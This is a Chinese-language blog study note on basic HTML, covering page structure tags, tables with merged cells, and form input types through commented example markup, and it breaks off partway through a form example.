    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/29/JavaWeb/" class="post-title-link" itemprop="url">JavaWeb</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-29 17:35:30" itemprop="dateCreated datePublished" datetime="2022-03-29T17:35:30+08:00">2022-03-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-11 22:50:52" itemprop="dateModified" datetime="2022-04-11T22:50:52+08:00">2022-04-11</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>8.2k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>7 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="0x01-HTML"><a href="#0x01-HTML" class="headerlink" title="0x01 HTML"></a>0x01 HTML</h1><p>HTML：决定页面上显示什么内容</p>
<p>CSS：页面上的内容显示的风格（内容的美观程度）</p>
<p>JavaScript：页面特效</p>
<h2 id="·HTML基础标签"><a href="#·HTML基础标签" class="headerlink" title="·HTML基础标签"></a>·HTML基础标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>    </span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">  	 	<span class="tag">&lt;<span class="name">title</span>&gt;</span>这是我的第一个网页<span class="tag">&lt;/<span class="name">title</span>&gt;</span>   </span><br><span class="line">   		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">		HELLO WORLD!<span class="tag">&lt;<span class="name">br</span>/&gt;</span> 你好 </span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>这里是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>这里是第二个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;路径&quot;</span> <span class="attr">width</span>=<span class="string">&quot;&quot;</span> <span class="attr">height</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;这里是一张图片&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;A&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>扫地僧<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>萧远山<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">&quot;square&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>乔峰<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">u</span>&gt;</span>阿朱<span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        水分子的化学式：H<span class="tag">&lt;<span class="name">sub</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sub</span>&gt;</span>O <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        氧气的化学式：O<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        5<span class="symbol">&amp;lt;</span>10<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        10<span class="symbol">&amp;gt;</span>5<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        5<span class="symbol">&amp;le;</span>10<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        10<span class="symbol">&amp;ge;</span>5<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        注册商标: <span class="symbol">&amp;reg;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        版权符号: <span class="symbol">&amp;copy;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>div1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>div2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1、html是解释型语言，不是编译型，浏览器是容错的</span></span><br><span class="line"><span class="comment">HTML页面由一对标签组成：&lt;html&gt;页面的开始标签  &lt;/html&gt;结束标签</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2、title:表示网页的标题  &lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="comment">3、meta标签设置编码方式 &lt;meta &gt;</span></span><br><span class="line"><span class="comment">4、&lt;br/&gt;表示换行，单标签，开始结束标签是同一个，斜杠放在单词后。</span></span><br><span class="line"><span class="comment">5、&lt;p&gt;&lt;/p&gt;段落标签</span></span><br><span class="line"><span class="comment">6、&lt;img  /&gt; 图片标签 </span></span><br><span class="line"><span class="comment">	alt属性:图片显示失败时会有里面的文字，表示图片的提示    	src属性表示图片文件的路径</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">7、路径的问题：1、相对路径 2、绝对路径</span></span><br><span class="line"><span class="comment">8、标题标签：&lt;h1&gt;&lt;/h1&gt;~&lt;h6&gt;&lt;/h6&gt;</span></span><br><span class="line"><span class="comment">9、列表标签：</span></span><br><span class="line"><span class="comment">   ol 有序列表&lt;ol&gt;&lt;/ol&gt; 里面有列表项&lt;li&gt;&lt;/li&gt; 		   </span></span><br><span class="line"><span class="comment">       type属性:显示类型：A，a ，I，i(罗马数字)，1(默认)</span></span><br><span class="line"><span class="comment">	   start属性：表示从*开始</span></span><br><span class="line"><span class="comment">	ul 无序列表&lt;ul&gt;&lt;/ul&gt; 里面有列表项&lt;li&gt;&lt;/li&gt; 以点标示</span></span><br><span class="line"><span class="comment">		type属性：disc(默认：圆饼状)、circle、square</span></span><br><span class="line"><span class="comment">		无序所以无start属性</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">10、&lt;b&gt;&lt;/b&gt;:加粗标签  &lt;i&gt;&lt;/i&gt;:斜体标签 &lt;u&gt;&lt;/u&gt;:下划线    可嵌套使用,配对</span></span><br><span class="line"><span class="comment">11、&lt;sub&gt;&lt;/sub&gt;:下标  ；  &lt;sup&gt;&lt;/sup&gt;:上标</span></span><br><span class="line"><span class="comment">12、&#x27;&amp;lt;&#x27;:小于    &#x27;&amp;gt;&#x27;:大于    &#x27;&amp;le;&#x27;:≤   &#x27;&amp;ge;&#x27;:≥</span></span><br><span class="line"><span class="comment">13、注册商标：&amp;reg;   版权符号: &amp;copy;</span></span><br><span class="line"><span class="comment">可以查询html实体</span></span><br><span class="line"><span class="comment">14、&lt;span&gt;&lt;/span&gt;：不换行的块标记，可以对围起来的内容进行独立修饰</span></span><br><span class="line"><span class="comment">15、超链接：&lt;a href=&quot;链接&quot;&gt;名&lt;/a&gt;</span></span><br><span class="line"><span class="comment">	href属性：链接地址</span></span><br><span class="line"><span class="comment">	target：_self(默认)：在本窗口打开； _blank:在一个新窗口打开；</span></span><br><span class="line"><span class="comment">	_parent:在父窗口打开；_top:在顶层窗口打开</span></span><br><span class="line"><span class="comment">16、div：层, 可定义文档中的分区或节,标签可以把文档分割为独立的、不同的部分。它可以用作严格的组织工具，并且不使用任何格式与其关联。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/29/JavaWeb/image-20220403212313433.png" alt="image-20220403212313433"></p>
<h2 id="·HTML的table标签"><a href="#·HTML的table标签" class="headerlink" title="·HTML的table标签"></a>·HTML的table标签</h2><p>表格标签</p>
<p>一个table，一个表格 </p>
<p><code>&lt;table&gt;&lt;/table&gt;</code> 属性：表格表框的属性：border   宽度：width    单元格间隔：cellspacing      单元格填充：cellpadding（与表格距离）</p>
<p>行：<code>&lt;tr&gt;&lt;/tr&gt;</code>    属性：对齐方式：align  (center,left,right)</p>
<p>列：<code>&lt;td&gt;&lt;/td&gt;</code>  属性：rowspan : rowspan=”2”:跨两行合并  colspan:跨列合并</p>
<p>表头列：<code>&lt;th&gt;&lt;/th&gt;</code></p>
<p>直线：<code>&lt;hr/&gt;</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>表格标签的学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">cellpadding</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>门派<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>成名绝技<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>内功<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>乔峰<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>丐帮<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>少林长拳<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>5000<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>虚竹<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>灵鹫宫<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>北冥神功<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>15000<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/29/JavaWeb/image-20220403213209806.png" alt="image-20220403213209806"><img src="/2022/03/29/JavaWeb/image-20220403213602713.png" alt="image-20220403213602713"></p>
<p><img src="/2022/03/29/JavaWeb/image-20220403213800979.png" alt="image-20220403213800979"></p>
<p><img src="/2022/03/29/JavaWeb/image-20220403214012789.png" alt="image-20220403214012789"></p>
<p>不过那些属性用的越来越少了，有css来修饰</p>
<p>表头效果：<img src="/2022/03/29/JavaWeb/image-20220403214251226.png" alt="image-20220403214251226"></p>
<p>实例：</p>
<p><img src="/2022/03/29/JavaWeb/image-20220403215129868.png" alt="image-20220403215129868"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>表格标签的学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">cellpadding</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>单价<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>数量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>小计<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>20<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;imgs/1.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;24&quot;</span> <span class="attr">height</span>=<span class="string">&quot;24&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>菠萝<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>15<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>75<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;imgs/1.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;24&quot;</span> <span class="attr">height</span>=<span class="string">&quot;24&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>西瓜<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>6<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>6<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>36<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;imgs/1.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;24&quot;</span> <span class="attr">height</span>=<span class="string">&quot;24&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">td</span>&gt;</span>总计<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;4&quot;</span>&gt;</span>211<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/29/JavaWeb/image-20220403220807674.png" alt="image-20220403220807674"></p>
<h2 id="·HTML的表单标签-form"><a href="#·HTML的表单标签-form" class="headerlink" title="·HTML的表单标签-form"></a>·HTML的表单标签-form</h2><p><img src="/2022/03/29/JavaWeb/image-20220403221825224.png" alt="image-20220403221825224"></p>
<p><code>&lt;form&gt;&lt;/form&gt;</code>表单</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=&quot;&quot; <span class="type">name</span>=&quot;&quot; <span class="keyword">value</span>=&quot;&quot;/&gt;</span><br><span class="line">所有的<span class="type">name</span>属性必须指定，否则这个文本框或者其他类型的数据将来是不会发送给服务器的</span><br><span class="line"></span><br><span class="line"><span class="keyword">input</span> <span class="keyword">type</span>=&quot;text&quot; 文本框，不需要<span class="keyword">value</span>属性</span><br><span class="line"></span><br><span class="line"><span class="keyword">input</span> <span class="keyword">type</span>=&quot;password&quot;  密码框 ，不需要<span class="keyword">value</span>属性</span><br><span class="line"></span><br><span class="line"><span class="keyword">input</span> <span class="keyword">type</span>=&quot;radio&quot; 单选按钮  需要注意的是：<span class="type">name</span>属性值保持一致，这样才有互斥效果，可以通过checked属性设置默认选中的项，其中<span class="keyword">value</span>属性是发送给服务器的值</span><br><span class="line"></span><br><span class="line"><span class="keyword">input</span> <span class="keyword">type</span>=&quot;checkbox&quot; 复选框，<span class="type">name</span>属性值建议保持一致，这样将来我们的服务器端获取值得时候获取的是一个数组，可以通过checked属性设置默认选中的项，其中<span class="keyword">value</span>属性是发送给服务器的值</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">select</span>&gt;&lt;/<span class="keyword">select</span>&gt;:下拉列表。每一个选项是&lt;<span class="keyword">option</span>&gt;&lt;/<span class="keyword">option</span>&gt;,其中<span class="keyword">option</span>的<span class="keyword">value</span>属性是发送给服务器的值，selected：表示默认选中的项</span><br><span class="line"></span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;表示多行文本框（或加文本域），不需要<span class="keyword">value</span>属性，他的<span class="keyword">value</span>值是开始结束标签中间的值，不要轻易换行</span><br><span class="line"></span><br><span class="line"><span class="keyword">input</span> <span class="keyword">type</span>=&quot;submit&quot; 提交按钮 有<span class="keyword">value</span>属性</span><br><span class="line"><span class="keyword">input</span> <span class="keyword">type</span>=&quot;reset&quot; 重置按钮 有<span class="keyword">value</span>属性</span><br><span class="line"><span class="keyword">input</span> <span class="keyword">type</span>=&quot;button&quot; 普通按钮 有<span class="keyword">value</span>属性</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>表单标签的学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;demo.html&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">           昵称：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nickName&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">           密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">           性别：<span 